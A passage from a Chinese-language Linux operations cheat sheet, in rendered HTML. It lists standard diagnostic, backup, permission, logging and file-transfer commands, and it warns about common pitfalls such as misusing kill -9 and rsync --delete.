class="line">hostnamectl | grep -E <span class="string">&#x27;Operating System|Kernel&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CPU 架构与核心数（容量规划基准）</span></span><br><span class="line">lscpu | grep -E <span class="string">&#x27;Architecture|CPU\(s\)|Model name&#x27;</span></span><br><span class="line">getconf LONG_BIT  <span class="comment"># 确认 32/64 位</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存总量与可用量（OOM 风险评估）</span></span><br><span class="line">free -h &amp;&amp; <span class="built_in">cat</span> /proc/meminfo | grep -E <span class="string">&#x27;MemTotal|MemAvailable|SwapTotal&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统启动时间与负载（稳定性指标）</span></span><br><span class="line"><span class="built_in">uptime</span></span><br><span class="line"><span class="built_in">who</span> -b  <span class="comment"># 最后启动时间</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-资源限制检查"><a href="#2-2-资源限制检查" class="headerlink" title="2.2 资源限制检查"></a>2.2 资源限制检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前 shell 资源限制（进程崩溃常见原因）</span></span><br><span class="line"><span class="built_in">ulimit</span> -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 core dump 配置（故障分析必需）</span></span><br><span class="line"><span class="built_in">ulimit</span> -c  <span class="comment"># 0 表示未启用</span></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/core_pattern</span><br><span class="line"></span><br><span class="line"><span class="comment"># IPC 资源占用（共享内存泄漏排查）</span></span><br><span class="line">ipcs -a</span><br><span class="line">ipcs -m -u  <span class="comment"># 共享内存使用率</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 1</strong>：<code>ulimit -c unlimited</code> 仅对当前 shell 生效，需写入 <code>/etc/security/limits.conf</code> 永久生效。格式：<code>* soft core unlimited</code>。</p>
-<p><strong>常见坑 2</strong>：<code>getconf LONG_BIT</code> 返回 32 位但内核是 64 位，说明运行了 32 位程序，可能存在内存寻址限制（最大 4GB）。</p>
-<h2 id="三、进程与性能诊断"><a href="#三、进程与性能诊断" class="headerlink" title="三、进程与性能诊断"></a>三、进程与性能诊断</h2><h3 id="3-1-进程状态分析"><a href="#3-1-进程状态分析" class="headerlink" title="3.1 进程状态分析"></a>3.1 进程状态分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实时进程监控（CPU/内存 Top N）</span></span><br><span class="line">top -b -n 1 | <span class="built_in">head</span> -20</span><br><span class="line">ps aux --<span class="built_in">sort</span>=-%mem | <span class="built_in">head</span> -10  <span class="comment"># 内存占用 Top 10</span></span><br><span class="line">ps aux --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span> -10  <span class="comment"># CPU 占用 Top 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进程树与父子关系（僵尸进程排查）</span></span><br><span class="line">ps -ejH  <span class="comment"># 树形显示</span></span><br><span class="line">ps -eo pid,ppid,<span class="built_in">stat</span>,cmd | grep Z  <span class="comment"># 查找僵尸进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进程打开的文件描述符（连接泄漏诊断）</span></span><br><span class="line">lsof -p &lt;PID&gt; | <span class="built_in">wc</span> -l  <span class="comment"># 总数</span></span><br><span class="line">lsof -p &lt;PID&gt; | grep -E <span class="string">&#x27;TCP|UDP&#x27;</span>  <span class="comment"># 网络连接</span></span><br><span class="line"><span class="built_in">cat</span> /proc/&lt;PID&gt;/limits | grep <span class="string">&#x27;open files&#x27;</span>  <span class="comment"># 进程限制</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-性能指标采集"><a href="#3-2-性能指标采集" class="headerlink" title="3.2 性能指标采集"></a>3.2 性能指标采集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CPU 使用率历史（sar 需安装 sysstat）</span></span><br><span class="line">sar -u 1 5  <span class="comment"># 每秒采样，共 5 次</span></span><br><span class="line">sar -q 1 5  <span class="comment"># 负载队列长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存与交换分区（Swap 高表示内存不足）</span></span><br><span class="line">sar -r 1 3</span><br><span class="line">sar -W 1 3  <span class="comment"># 页面交换速率，&gt;100/s 需关注</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 磁盘 IO 等待（iowait &gt;20% 表示 IO 瓶颈）</span></span><br><span class="line">iostat -x 1 3</span><br><span class="line">sar -d 1 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实时监控变化（高亮显示差异）</span></span><br><span class="line">watch -d -n 1 <span class="string">&#x27;ps aux | grep java&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 3</strong>：<code>top</code> 默认显示所有 CPU 核心总和，按 <code>1</code> 键切换到分核心视图，单核 100% 可能被平均后显示为 12.5%（8 核机器）。</p>
-<p><strong>常见坑 4</strong>：<code>free</code> 命令的 <code>available</code> 列才是真实可用内存，<code>free</code> 列不包含 cache&#x2F;buffer 可回收部分，误判会导致不必要的扩容。</p>
-<h2 id="四、网络诊断与连接追踪"><a href="#四、网络诊断与连接追踪" class="headerlink" title="四、网络诊断与连接追踪"></a>四、网络诊断与连接追踪</h2><h3 id="4-1-端口与连接状态"><a href="#4-1-端口与连接状态" class="headerlink" title="4.1 端口与连接状态"></a>4.1 端口与连接状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听端口检查（服务启动验证）</span></span><br><span class="line">ss -tlnp  <span class="comment"># TCP 监听端口及进程</span></span><br><span class="line">netstat -tlnp  <span class="comment"># 旧版系统使用</span></span><br><span class="line">lsof -i :3306  <span class="comment"># 检查特定端口占用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接状态统计（连接池泄漏排查）</span></span><br><span class="line">ss -s  <span class="comment"># 汇总统计</span></span><br><span class="line">ss -tan | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c  <span class="comment"># 各状态数量</span></span><br><span class="line">netstat -n | awk <span class="string">&#x27;/^tcp/ &#123;print $6&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找大量 TIME_WAIT（调优参数参考）</span></span><br><span class="line">ss -tan state time-wait | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-路由与连通性测试"><a href="#4-2-路由与连通性测试" class="headerlink" title="4.2 路由与连通性测试"></a>4.2 路由与连通性测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 路由表检查（网络不通首要排查）</span></span><br><span class="line">ip route show</span><br><span class="line">route -n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连通性测试（分层诊断）</span></span><br><span class="line">ping -c 4 &lt;IP&gt;  <span class="comment"># ICMP 层</span></span><br><span class="line">telnet &lt;IP&gt; &lt;PORT&gt;  <span class="comment"># TCP 层</span></span><br><span class="line">curl -v http://&lt;IP&gt;:&lt;PORT&gt;  <span class="comment"># 应用层</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径追踪（定位网络节点故障）</span></span><br><span class="line">traceroute -n &lt;IP&gt;</span><br><span class="line">mtr -r -c 10 &lt;IP&gt;  <span class="comment"># 更详细的路由报告</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS 解析验证</span></span><br><span class="line">nslookup &lt;domain&gt;</span><br><span class="line">dig &lt;domain&gt; +short</span><br><span class="line">host &lt;domain&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 5</strong>：<code>ping</code> 通但 <code>telnet</code> 不通，说明防火墙允许 ICMP 但阻止了 TCP 端口，需检查 <code>iptables</code> 或云安全组规则。</p>
-<h2 id="五、文件系统与磁盘管理"><a href="#五、文件系统与磁盘管理" class="headerlink" title="五、文件系统与磁盘管理"></a>五、文件系统与磁盘管理</h2><h3 id="5-1-磁盘空间诊断"><a href="#5-1-磁盘空间诊断" class="headerlink" title="5.1 磁盘空间诊断"></a>5.1 磁盘空间诊断</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 磁盘使用率检查（告警阈值通常 85%）</span></span><br><span class="line"><span class="built_in">df</span> -hT  <span class="comment"># 显示文件系统类型</span></span><br><span class="line"><span class="built_in">df</span> -i   <span class="comment"># inode 使用率（小文件过多会耗尽）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录空间占用排查</span></span><br><span class="line"><span class="built_in">du</span> -sh /*  <span class="comment"># 根目录下各目录大小</span></span><br><span class="line"><span class="built_in">du</span> -h --max-depth=1 /var | <span class="built_in">sort</span> -hr | <span class="built_in">head</span> -10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找大文件（清理目标）</span></span><br><span class="line">find / -<span class="built_in">type</span> f -size +1G -<span class="built_in">exec</span> <span class="built_in">ls</span> -lh &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find /var/log -name <span class="string">&quot;*.log&quot;</span> -mtime +30  <span class="comment"># 30 天前日志</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-2-文件查找与内容检索"><a href="#5-2-文件查找与内容检索" class="headerlink" title="5.2 文件查找与内容检索"></a>5.2 文件查找与内容检索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按名称查找（支持通配符）</span></span><br><span class="line">find /etc -name <span class="string">&quot;*.conf&quot;</span> -<span class="built_in">type</span> f</span><br><span class="line">locate nginx.conf  <span class="comment"># 需定期 updatedb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按时间查找（故障时间段文件）</span></span><br><span class="line">find /var/log -mtime -1  <span class="comment"># 最近 24 小时修改</span></span><br><span class="line">find /tmp -atime +7      <span class="comment"># 7 天未访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容检索（日志分析核心）</span></span><br><span class="line">grep -r <span class="string">&quot;ERROR&quot;</span> /var/log/app/ --include=<span class="string">&quot;*.log&quot;</span></span><br><span class="line">grep -E <span class="string">&quot;OutOfMemory|StackOverflow&quot;</span> /var/log/messages</span><br><span class="line">zgrep <span class="string">&quot;exception&quot;</span> /var/log/app/*.gz  <span class="comment"># 压缩日志搜索</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合管道过滤</span></span><br><span class="line"><span class="built_in">cat</span> app.log | grep <span class="string">&quot;2024-01-15&quot;</span> | grep -v <span class="string">&quot;DEBUG&quot;</span> | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 6</strong>：<code>find</code> 的 <code>-mtime +7</code> 是 7 天前，<code>-mtime -7</code> 是最近 7 天，<code>-mtime 7</code> 是恰好第 7 天，容易混淆导致误删。</p>
-<p><strong>常见坑 7</strong>：<code>grep</code> 默认不搜索二进制文件，加 <code>-a</code> 参数强制文本模式，但可能输出乱码，建议先用 <code>file</code> 命令确认文件类型。</p>
-<h2 id="六、安全操作：备份、执行、回滚三段式"><a href="#六、安全操作：备份、执行、回滚三段式" class="headerlink" title="六、安全操作：备份、执行、回滚三段式"></a>六、安全操作：备份、执行、回滚三段式</h2><h3 id="6-1-文件操作标准流程"><a href="#6-1-文件操作标准流程" class="headerlink" title="6.1 文件操作标准流程"></a>6.1 文件操作标准流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 备份阶段（强制要求）</span></span><br><span class="line"><span class="built_in">cp</span> /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak.$(<span class="built_in">date</span> +%Y%m%d_%H%M%S)</span><br><span class="line">tar -czf /backup/etc_$(<span class="built_in">date</span> +%Y%m%d).tar.gz /etc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 执行变更</span></span><br><span class="line">vim /etc/nginx/nginx.conf</span><br><span class="line"><span class="comment"># 或批量替换</span></span><br><span class="line">sed -i.bak <span class="string">&#x27;s/worker_processes 2/worker_processes 4/&#x27;</span> /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 验证配置</span></span><br><span class="line">nginx -t  <span class="comment"># 语法检查</span></span><br><span class="line">diff /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak  <span class="comment"># 对比差异</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 应用变更</span></span><br><span class="line">systemctl reload nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 回滚预案（验证失败时）</span></span><br><span class="line"><span class="built_in">cp</span> /etc/nginx/nginx.conf.bak.20240115_143000 /etc/nginx/nginx.conf</span><br><span class="line">systemctl reload nginx</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-2-用户与权限变更"><a href="#6-2-用户与权限变更" class="headerlink" title="6.2 用户与权限变更"></a>6.2 用户与权限变更</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 备份现有权限</span></span><br><span class="line">getfacl -R /data/app &gt; /backup/acl_backup.txt</span><br><span class="line"><span class="built_in">cp</span> /etc/passwd /etc/passwd.bak</span><br><span class="line"><span class="built_in">cp</span> /etc/group /etc/group.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 创建用户（生产环境禁止直接 root）</span></span><br><span class="line">useradd -m -s /bin/bash -G docker,<span class="built_in">sudo</span> appuser</span><br><span class="line">passwd appuser  <span class="comment"># 交互式设置密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 权限调整（最小权限原则）</span></span><br><span class="line"><span class="built_in">chown</span> -R appuser:appuser /data/app</span><br><span class="line"><span class="built_in">chmod</span> 750 /data/app  <span class="comment"># 所有者 rwx，组 r-x，其他无权限</span></span><br><span class="line"><span class="built_in">chmod</span> 640 /data/app/config.yml  <span class="comment"># 配置文件禁止执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 验证权限</span></span><br><span class="line">su - appuser -c <span class="string">&quot;ls -la /data/app&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> -u appuser <span class="built_in">touch</span> /data/app/test  <span class="comment"># 测试写权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 回滚</span></span><br><span class="line">setfacl --restore=/backup/acl_backup.txt</span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 8</strong>：<code>chmod -R 777</code> 是安全灾难，应使用 ACL 精细控制。<code>setfacl -m u:appuser:rwx /data</code> 仅授权特定用户。</p>
-<p><strong>常见坑 9</strong>：<code>chown</code> 后忘记检查 SUID&#x2F;SGID 位，<code>find / -perm /6000</code> 查找所有特殊权限文件，避免权限提升漏洞。</p>
-<h3 id="6-3-进程管理安全操作"><a href="#6-3-进程管理安全操作" class="headerlink" title="6.3 进程管理安全操作"></a>6.3 进程管理安全操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 识别目标进程（避免误杀）</span></span><br><span class="line">ps aux | grep nginx | grep -v grep</span><br><span class="line">pgrep -a nginx  <span class="comment"># 显示完整命令行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 优雅停止（先尝试 SIGTERM）</span></span><br><span class="line"><span class="built_in">kill</span> -15 &lt;PID&gt;</span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line">ps -p &lt;PID&gt;  <span class="comment"># 检查是否退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 强制终止（最后手段）</span></span><br><span class="line"><span class="built_in">kill</span> -9 &lt;PID&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 批量操作（高危，需二次确认）</span></span><br><span class="line">pkill -f <span class="string">&quot;java.*old-version&quot;</span>  <span class="comment"># 先 dry-run</span></span><br><span class="line">pgrep -f <span class="string">&quot;java.*old-version&quot;</span>  <span class="comment"># 确认目标</span></span><br><span class="line">pkill -9 -f <span class="string">&quot;java.*old-version&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 后台任务管理</span></span><br><span class="line"><span class="built_in">nohup</span> ./app.sh &gt; /var/log/app.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="built_in">echo</span> $! &gt; /var/run/app.pid  <span class="comment"># 记录 PID</span></span><br><span class="line"><span class="built_in">disown</span> -h %1  <span class="comment"># 脱离终端控制</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 10</strong>：<code>kill -9</code> 无法被捕获，进程无法清理资源（关闭文件、释放锁），应优先使用 <code>kill -15</code> 等待 30 秒后再 <code>-9</code>。</p>
-<h2 id="七、日志分析与故障追踪"><a href="#七、日志分析与故障追踪" class="headerlink" title="七、日志分析与故障追踪"></a>七、日志分析与故障追踪</h2><h3 id="7-1-系统日志检索"><a href="#7-1-系统日志检索" class="headerlink" title="7.1 系统日志检索"></a>7.1 系统日志检索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># systemd 日志（现代 Linux 发行版）</span></span><br><span class="line">journalctl -xe  <span class="comment"># 最近错误详情</span></span><br><span class="line">journalctl -u nginx.service --since <span class="string">&quot;2024-01-15 14:00&quot;</span> --<span class="keyword">until</span> <span class="string">&quot;14:30&quot;</span></span><br><span class="line">journalctl -f  <span class="comment"># 实时跟踪</span></span><br><span class="line">journalctl -p err -b  <span class="comment"># 本次启动的错误日志</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传统日志文件</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/syslog  <span class="comment"># 实时查看</span></span><br><span class="line"><span class="built_in">tail</span> -n 100 /var/log/messages | grep -i error</span><br><span class="line">dmesg | <span class="built_in">tail</span> -50  <span class="comment"># 内核消息（硬件故障）</span></span><br><span class="line">dmesg -T  <span class="comment"># 带时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录审计</span></span><br><span class="line">last -10  <span class="comment"># 最近 10 次登录</span></span><br><span class="line">lastb    <span class="comment"># 失败登录尝试</span></span><br><span class="line"><span class="built_in">who</span> /var/log/wtmp  <span class="comment"># 历史登录记录</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="7-2-应用日志分析模式"><a href="#7-2-应用日志分析模式" class="headerlink" title="7.2 应用日志分析模式"></a>7.2 应用日志分析模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计错误频率（识别异常峰值）</span></span><br><span class="line">grep <span class="string">&quot;ERROR&quot;</span> app.log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取慢查询（性能优化依据）</span></span><br><span class="line">awk <span class="string">&#x27;/query time: [0-9]+/ &#123;if ($3 &gt; 1000) print&#125;&#x27;</span> mysql-slow.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多文件合并时间线（分布式追踪）</span></span><br><span class="line"><span class="built_in">sort</span> -m -t<span class="string">&#x27; &#x27;</span> -k1,2 app1.log app2.log | grep <span class="string">&quot;request_id=12345&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志采样（大文件快速分析）</span></span><br><span class="line">sed -n <span class="string">&#x27;1~100p&#x27;</span> huge.log | grep <span class="string">&quot;pattern&quot;</span>  <span class="comment"># 每 100 行取 1 行</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="八、文件传输与归档"><a href="#八、文件传输与归档" class="headerlink" title="八、文件传输与归档"></a>八、文件传输与归档</h2><h3 id="8-1-远程拷贝最佳实践"><a href="#8-1-远程拷贝最佳实践" class="headerlink" title="8.1 远程拷贝最佳实践"></a>8.1 远程拷贝最佳实践</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SCP 传输（简单场景）</span></span><br><span class="line">scp -P 22 -i ~/.ssh/id_rsa local.tar.gz user@remote:/backup/</span><br><span class="line">scp -r -C user@remote:/data/logs/ ./  <span class="comment"># -C 启用压缩</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rsync 增量同步（大规模数据）</span></span><br><span class="line">rsync -avz --progress /data/ user@remote:/backup/data/</span><br><span class="line">rsync -avz --delete src/ dst/  <span class="comment"># 镜像同步（删除目标多余文件）</span></span><br><span class="line">rsync -avz --exclude=<span class="string">&#x27;*.log&#x27;</span> --exclude=<span class="string">&#x27;tmp/&#x27;</span> /app/ remote:/app/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 断点续传（网络不稳定环境）</span></span><br><span class="line">rsync -avz --partial --progress large.tar.gz remote:/backup/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限速传输（避免带宽占满）</span></span><br><span class="line">rsync -avz --bwlimit=10240 /data/ remote:/backup/  <span class="comment"># 10MB/s</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="8-2-压缩归档策略"><a href="#8-2-压缩归档策略" class="headerlink" title="8.2 压缩归档策略"></a>8.2 压缩归档策略</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份前压缩（节省空间）</span></span><br><span class="line">tar -czf backup_$(<span class="built_in">date</span> +%Y%m%d).tar.gz /data/</span><br><span class="line">tar -cjf backup.tar.bz2 /data/  <span class="comment"># bzip2 压缩率更高但更慢</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分卷压缩（大文件传输）</span></span><br><span class="line">tar -czf - /data/ | <span class="built_in">split</span> -b 1G - backup.tar.gz.part_</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压验证（避免损坏）</span></span><br><span class="line">tar -tzf backup.tar.gz | <span class="built_in">head</span>  <span class="comment"># 列出内容不解压</span></span><br><span class="line">tar -xzf backup.tar.gz -C /restore/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密归档（敏感数据）</span></span><br><span class="line">tar -czf - /data/ | openssl enc -aes-256-cbc -salt -out backup.tar.gz.enc</span><br><span class="line">openssl enc -d -aes-256-cbc -<span class="keyword">in</span> backup.tar.gz.enc | tar -xzf -</span><br></pre></td></tr></table></figure>
-
-<p><strong>常见坑 11</strong>：<code>tar -czf</code> 会跟随符号链接，导致重复打包，加 <code>-h</code> 参数解引用或 <code>--exclude</code> 排除链接。</p>
-<p><strong>常见坑 12</strong>：<code>rsync</code> 的 <code>--delete</code> 参数会删除目标目录多余文件，误用会导致数据丢失，建议先 <code>--dry-run</code> 预览。</p>
-<h2 id="九、架构层面的可观测性建议"><a href="#九、架构层面的可观测性建议" class="headerlink" title="九、架构层面的可观测性建议"></a>九、架构层面的可观测性建议</h2><h3 id="9-1-监控与告警集成"><a href="#9-1-监控与告警集成" class="headerlink" title="9.1 监控与告警集成"></a>9.1 监控与告警集成</h3><p>生产环境不应依赖手动执行命令，需将关键指标接入监控系统：</p>
-<ul>
-<li><strong>Metrics 采集</strong>：部署 node_exporter（Prometheus）或 Telegraf（InfluxDB），采集 CPU&#x2F;内存&#x2F;磁盘&#x2F;网络指标，设置 P95&#x2F;P99 阈值告警</li>
-<li><strong>日志聚合</strong>：使用 ELK&#x2F;Loki 集中收集 <code>/var/log</code> 和应用日志，配置错误关键词告警规则（ERROR&#x2F;FATAL&#x2F;OOM）</li>
-<li><strong>APM 追踪</strong>：Java 应用集成 SkyWalking&#x2F;Jaeger，自动关联慢查询和异常堆栈，减少 <code>lsof</code>&#x2F;<code>strace</code> 手动排查</li>
-</ul>
-<h3 id="9-2-变更管理与灰度发布"><a href="#9-2-变更管理与灰度发布" class="headerlink" title="9.2 变更管理与灰度发布"></a>9.2 变更管理与灰度发布</h3><p>所有生产变更必须遵循：</p>
-<ul>
-<li><strong>Pre-flight 检查</strong>：自动化脚本验证磁盘空间（<code>df -h</code>）、端口占用（<code>ss -tlnp</code>）、配置语法（<code>nginx -t</code>）</li>
-<li><strong>金丝雀部署</strong>：先在 1% 流量节点执行变更，监控错误率和延迟 15 分钟，通过后逐步扩大到 10%&#x2F;50%&#x2F;100%</li>
-<li><strong>自动回滚</strong>：设置 SLO 阈值（如错误率 &gt;1%），触发时自动执行 <code>systemctl restart</code> 或切换旧版本二进制文件</li>
-<li><strong>变更日志</strong>：所有 <code>sed -i</code>&#x2F;<code>chown</code>&#x2F;<code>systemctl</code> 操作记录到 Git 仓库，配合 Ansible&#x2F;Terraform 实现 IaC</li>
-</ul>
-<h3 id="9-3-容量规划与成本优化"><a href="#9-3-容量规划与成本优化" class="headerlink" title="9.3 容量规划与成本优化"></a>9.3 容量规划与成本优化</h3><p>定期（每周）执行资源审计：</p>
